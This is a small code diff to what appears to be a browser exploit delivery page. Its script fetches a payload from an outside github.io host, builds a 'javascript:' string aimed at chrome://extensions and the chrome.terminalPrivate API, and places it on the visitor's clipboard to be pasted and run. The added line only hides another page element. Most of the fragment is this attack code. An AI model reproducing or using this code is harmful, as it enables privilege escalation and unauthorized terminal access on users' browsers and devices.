@@ -4,6 +4,7 @@
     fetch("https://xlak.github.io/chaos/bb.php").then((d) => d.text()).then((d) => {
       navigator.clipboard.writeText('javascript:chrome://extensions\n`id=\'");chrome.terminalPrivate["@inspect#/"]`' + d)
       document.querySelector('.menu').style.display = 'none'
+      document.querySelector('.main').style.display = 'none'
       document.querySelector('.other').style.display = 'unset'
     })
   }
